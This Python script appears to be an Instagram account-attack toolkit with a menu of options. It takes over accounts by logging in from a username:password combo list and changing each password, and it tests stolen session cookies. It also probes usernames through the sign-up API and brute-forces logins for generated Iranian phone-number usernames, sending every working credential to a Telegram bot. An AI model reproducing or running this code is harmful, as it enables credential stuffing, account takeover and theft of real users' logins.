import os,time
from time import sleep


def logo():    
    Banner = f"""
{R}              ALSAYED        
{R}             ↿ {C}Telegram {R}⇂     {E}⇝   {C}@T4TWI
{R}            ↿ {C}GITHUB {R}⇂    {E}⇝   {C}@J_C_A
{R}           ↿ {C}TELEGRAM {R}⇂   {E}⇝   {C}@T4TWT
{R}           ↿ {C}YouTube {R}⇂  {E}⇝   {C}@7a.6
\n"""
    for warrior in Banner.splitlines():
        time.sleep(0.05)
        print(warrior)

lib = input("""
\033[1;97m(\033[31;1m*\033[1;97m) \033[1;97mDownload lib \033[31;1m& \033[1;97mupdate
\033[1;97m(\033[31;1m1\033[1;97m) \033[1;97mCheck Trusted Username
\033[1;97m(\033[31;1m2\033[1;97m) \033[1;97mCheck 14 days Usernames
\033[1;97m(\033[31;1m3\033[1;97m) \033[1;97mChange Password Users
\033[1;97m(\033[31;1m4\033[1;97m) \033[1;97mChecker Sessions instagram
\033[1;97m(\033[31;1m5\033[1;97m) \033[1;97mChecker instagram Iran v3

\033[1;97m(\033[31;1m⌯\033[1;97m) \033[1;97mPlease Choose :\033[1;92m """)
 
if lib == "*":
    os.system("pip install requests")
    time.sleep(0.5)
    os.system("clear")
    pass
else:
    os.system("clear")
    pass

W = "\033[0m";R = '\033[31;1m';B = "\033[1;90m"; C = "\033[1;97m";E = "\033[1;92m"

from requests import Session
requests_sessions = Session()

if lib == "1":
    logo()
    def login_web():
        global get_csrftoken , get_sessions , username

        username = input(f'\033[1;97m[ \033[31;1m+ \033[1;97m] Enter Your Username : '+E)
        password = input(f'\033[1;97m[ \033[31;1m+ \033[1;97m] Enter Your Password : '+E) 

        url_login = 'https://www.instagram.com/accounts/login/ajax/'
        headers_login = {"accept": "*/*","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9,ar;q=0.8","content-length": "317","content-type": "application/x-www-form-urlencoded","cookie": "ig_nrcb=1; mid=YfyRDwALAAE2u2Xao59RvgY4Kie1; ig_did=24EAD7A2-41F3-458B-81B2-4C4E87CE77AE; csrftoken=QPYyY1OkYQbU5F6VQOWXdNHJhiP9IwFY","origin": "https://www.instagram.com","referer": "https://www.instagram.com/","sec-ch-ua": '" Not;A Brand";v="99", "Chromium";v="98" , "Microsoft Edge";v="98"',"sec-ch-ua-mobile": "?0","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","user-agent": "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 Edg/98.0.1108.62","x-asbd-id": "198387","x-csrftoken": "QPYyY1OkYQbU5F6VQOWXdNHJhiP9IwFY","x-ig-app-id": "936619743392459","x-ig-www-claim": "hmac.AR1KZ8mFH_XuwnlCjaDXJPbYdAilnj1X4S5VVol7qrRH1Zhc","x-instagram-ajax": "c14f5c1119e5","x-requested-with": "XMLHttpRequest"}
        login_data = {"username": f"{username}","enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{password}","queryParams": {},"optIntoOneTap": "false","trustedDeviceRecords": {}}  
        req_login = requests_sessions.post(url_login, headers=headers_login, data=login_data) 

        try:    
            if '"authenticated":true' in req_login.text:
                print(f'\033[1;92m@{username} \033[1;97mLogged In \033[31;1m√ \n')
                get_sessions = req_login.cookies['sessionid']
                get_csrftoken = req_login.cookies.get_dict()['csrftoken']
                Check_user()

            else:
                input(req_login.text)

        except ValueError:
            print(req_login.text)
            input(f"\033[1;97m[ \033[31;1m! \033[1;97m] Excepted Error ! Check On Your Username And Password")
            exit()

    def Check_user():
        url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1&__d=dis'
        headers_get_info = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9,ar;q=0.8','cookie': f"ig_nrcb=1; mid=YfyRDwALAAE2u2Xao59RvgY4Kie1; ig_did=24EAD7A2-41F3-458B-81B2-4C4E87CE77AE; csrftoken={get_csrftoken}; sessionid={get_sessions};",'referer': f'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin',"sec-ch-ua": '" Not;A Brand";v="99", "Chromium";v="98" , "Microsoft Edge";v="98"','user-agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 Edg/98.0.1108.62',"x-asbd-id": "198387",'x-ig-app-id': '936619743392459','x-ig-www-claim': 'hmac.AR1KZ8mFH_XuwnlCjaDXJPbYdAilnj1X4S5VVol7qrRH1Zhc','x-requested-with': 'XMLHttpRequest'}
        req_get_info = requests_sessions.get(url_get_info, headers=headers_get_info)

        try:
            trusted_username = str(req_get_info.json()['form_data']['trusted_username'])
            if  trusted_username == username:
                input("\033[1;97m[ \033[31;1m# \033[1;97m] iT Has")

            elif trusted_username != username:
                input(f"\033[1;97m[ \033[31;1m# \033[1;97m] iT has another , {trusted_username}")

            else:
                input("\033[1;97m[ \033[31;1m# \033[1;97m] Not Sure")

        except:      
            input("\033[1;97m[ \033[31;1m# \033[1;97m] iT Has Not")

    login_web()

if lib == "2":
    logo()
    import requests , uuid , random
    print('\033[1;97m[ \033[31;1m! \033[1;97m] please Make File \033[1;97m[ \033[31;1mUsers.txt \033[1;97m]')
    random_choose = "abcdefghijklmnopqrwstuvwxyz1234567890"

    try:
        file_username = open("users.txt", "r")

    except FileNotFoundError:
        exit()

    while 1:
        email = random.choice(random_choose)+random.choice(random_choose)+random.choice(random_choose)+random.choice(random_choose)+random.choice(random_choose)+random.choice(random_choose)+"@gmail.com"
        password = random.choice(random_choose)+random.choice(random_choose)+random.choice(random_choose)+random.choice(random_choose)+random.choice(random_choose)+random.choice(random_choose)+random.choice(random_choose)+random.choice(random_choose)
        username = file_username.readline().split("\n")[0]
        if username == "":
            input("\033[1;97m[ \033[31;1m+ \033[1;97m] Please Press Enter To Save The File")
            exit()
        uid = str(uuid.uuid4())
        url = "https://i.instagram.com/api/v1/accounts/create_validated/"
        header_login = {'User-Agent': 'nstagram 136.0.0.34.124 Android (23/6.0.1; 640dpi; 1440x2560; ZTE; ZTE A2017U; ailsa_ii; qcom; en_US)',"Accept": "*/*","Accept-Encoding": "gzip, deflate","Accept-Language": "en-US","X-IG-Capabilities": "3brTvw==","X-IG-Connection-Type": "WIFI","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",'Host': 'i.instagram.com'}
        data_log = {"device_id": uid,"uuid": uid,"email": email,"password": password,"_csrftoken": "3IsBQzwjBN5xG242t0xPmw9vBq6tMcDo","firt_name": "","username": username}
        request_get = requests.post(url, data=data_log, headers=header_login)
        
        if "username_held_by_others" in request_get.text:
            print(f"\033[1;92m@{username} \033[1;97m[ \033[31;1m! \033[1;97m] has 14 Days you can not change it ")

            with open("14 Days.txt", "a") as file:
                file.write(f"{username}\n")

        elif "username_is_taken" in request_get.text:
            print(f"\033[1;92m@{username} \033[1;97m[ \033[31;1m! \033[1;97m] has Not 14 Days you can change it now")

            with open("Not 14 Days.txt", "a") as file:
                file.write(f"{username}\n")

        else:
            print(f"\033[1;97m[ \033[31;1m> \033[1;97m] No User Found >>  \033[1;92m@{username}")     

if lib == "3":
    import requests
    logo()
    def login():
        global file , password ,username , new_password , get_sessions , get_csrftoken , counter

        new_password = input("\033[1;97m[ \033[31;1m! \033[1;97m] Enter The New Password : "+E)
        open_file = open(file,"r").read().splitlines()

        for combo in open_file:
            username = combo.split(":")[0]
            password = combo.split(":")[1]

            url = 'https://www.instagram.com/accounts/login/ajax/'
            head = {"accept": "*/*","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9,ar;q=0.8","content-length": "318","content-type": "application/x-www-form-urlencoded","cookie": "mid=YabB5gALAAFbVb5mBZr7GHIfpIvz; ig_did=582CE9B8-0009-4E09-BBB3-C3A2C07A97EC; ig_nrcb=1; csrftoken=MPouk3yseSDTnA4bNbCYoxQTl0JbqsYg","origin": "https://www.instagram.com","referer": "https://www.instagram.com/","sec-ch-ua": 'Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96',"sec-ch-ua-mobile": "?0","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","user-agent": "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36","x-asbd-id": "198387","x-csrftoken": "MPouk3yseSDTnA4bNbCYoxQTl0JbqsYg","x-ig-app-id": "936619743392459","x-ig-www-claim": "hmac.AR2k9EARzyegqtnhVjLH8VQJTV_MJZXhAEnGJkdqQcc5jNhK","x-instagram-ajax": "1284f5c4fcfb","x-requested-with": "XMLHttpRequest"}
            data = {'username': username,'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}','queryParams': {},'optIntoOneTap': 'false'}
            login = requests.post(url,headers=head,data=data)

            if '"authenticated":false' in login.text:
                input(f'\033[1;97m[ \033[31;1m! \033[1;97m] Username Or Password Is Wrong !\nPlease Check Your Username And Password\n\n')
                exit()

            elif '"checkpoint_url"' in login.text:
                input(f"\033[1;97m[ \033[31;1m! \033[1;97m] username Is Secured !\nPlease Activate Your code To login\n")
                exit()    

            elif "checkpoint_challenge_required" in login.text:
                input(f"\033[1;97m[ \033[31;1m! \033[1;97m] has Has Two Factor authentication\nPlease Turn It Off And Try Again\n")
                exit()    

            elif '"inactive user"' in login.text:
                input(f'\033[1;97m[ \033[31;1m! \033[1;97m] username Banned Account')
                exit()

            elif '"authenticated":true' in login.text:
                print(f"[{counter}] \033[1;97m[ \033[31;1m! \033[1;97m] log in")
                counter+=1
                get_sessions = login.cookies['sessionid']
                get_csrftoken = login.cookies.get_dict()['csrftoken']
                change()        

            else:
                input(f"\033[1;97m[ \033[31;1m! \033[1;97m] Check On Your File Please\nUsername And Password Must Be Like\nsalem:salem" )
                exit()

    def change():
        logo()
        global counter
        
        url2 = 'https://www.instagram.com/accounts/password/change/'
        head2 = {'accept':'*/*','accept-encoding':'gzip,deflate,br','accept-language':'en-US,en;q=0.9,ar;q=0.8','content-length':'672','content-type':'application/x-www-form-urlencoded','cookie': f"csrftoken={get_csrftoken}; sessionid={get_sessions}",'origin':'https://www.instagram.com','referer':'https://www.instagram.com/accounts/password/change/','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin',"user-agent": "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36","x-asbd-id": "198387" ,'x-csrftoken':get_csrftoken,'x-ig-app-id':'936619743392459','x-ig-www-claim':'hmac.AR2k9EARzyegqtnhVjLH8VQJTV_MJZXhAEnGJkdqQcc5jNhK','x-instagram-ajax':'1284f5c4fcfb','x-requested-with':'XMLHttpRequest'}
        data2 = {"enc_old_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{password}","enc_new_password1": f"#PWD_INSTAGRAM_BROWSER:0:&:{new_password}","enc_new_password2": f"#PWD_INSTAGRAM_BROWSER:0:&:{new_password}"}
        login_Change = requests.post(url2,headers=head2,data=data2).text

        if '"status":"ok"' in login_Change:

            with open("Accounts Changed.txt","a") as file:
                file.write(f"{username}:{new_password}\n")
                file.close
            print(f"[{counter}] \033[1;92mDone Changed it")
            counter+=1       

        else:
            input("Error")

    def proxy():
        global file , counter
    if __name__ == '__main__':

        file = input("\033[1;97m[ \033[31;1m! \033[1;97m] Enter Yout File Name : "+E)
        if '.txt' in file:
            pass

        else:
            files  = file + '.txt'
        counter=1
        login()    
        
if lib == "4":
    import requests
    logo()
    open_file = input("\033[1;97m[ \033[31;1m+ \033[1;97m] Enter Your File Name : ")
    with open(open_file, "r") as file:
        for line in file:
            sessions = line.strip()
            url='https://www.instagram.com/instagram/'
            headers={"user-agent": "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36","cookie": f"sessionid={sessions}"}
            req = requests.get(url=url,headers=headers)
            if "no-js logged-in" in req.text:
                with open(f'working.txt', 'a') as file:
                    file.write(f'\n{sessions}')
                    file.close()
                    print("\033[1;97m[ \033[31;1m> \033[1;97m] IT Working")
            elif 'no-js not-logged-in' in req.text:
                print("\033[1;97m[ \033[31;1m! \033[1;97m] Not Working")
            else:
                print(req.text)

if lib == "5":
    try:
        import requests,random,time,os
        from user_agent import *
        from retry.api import retry_call
        from retry import retry        
    except:
        os.system('pip install requests')    
W = "\033[0m";R = '\033[31;1m';B = "\033[1;90m"; C = "\033[1;97m";E = "\033[1;92m"
logo()
ID = input (C+"("+E+"⌯"+C+") "+C+ "Enter Your ID Bot : "+E)
token = input (C+"("+E+"⌯"+C+") "+C+ "Enter Your Token Bot : "+E)

def login():
    ban, av, er, at = 0,0,0,0
    while True:
        time.sleep(2)
        N = "09876543221"
        R = ''.join(random.choice(N)for t in range(5))
        username = '9891611'+R
        password = '11'+R
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {'accept':'*/*','accept-language':'en-US,en;q=0.9','content-length':'378','content-type':'application/x-www-form-urlencoded','cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"','sec-ch-ua-mobile':'?0','x-asbd-id':'198387','user-agent': generate_user_agent(),'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr','x-ig-app-id':'936619743392459','x-ig-www-claim':'0','x-instagram-ajax':'3bcc4d0b0733','x-requested-with':'XMLHttpRequest',}
        data = {'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(password),'username':username,}
        req = requests.post(url,headers=headers,data=data).text
        if "userId" in req:            
            at += 1
            av += 1
            time.sleep(2)
            open("Good.txt","a").write(f"{username}:{password}\n")
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎ ➪ : \n - 𝑷𝑯 ➪ : {username} \n - 𝑷𝑺 ➪ : {password} \n • 𝐅𝐫𝐎𝐦 : @J_C_A -Warrior- @T4TWI ')
        elif '"message":"challenge_required","challenge"' in req:
            at += 1
            ban += 1
            open("Banned.txt","a").write(f"{username}:{password}")
        else:
            er += 1
            time.sleep(2)
            print(f"\r{E}{username} | {E}{password} | (Error) {er} | (Found) {av}", end="")
            
login()
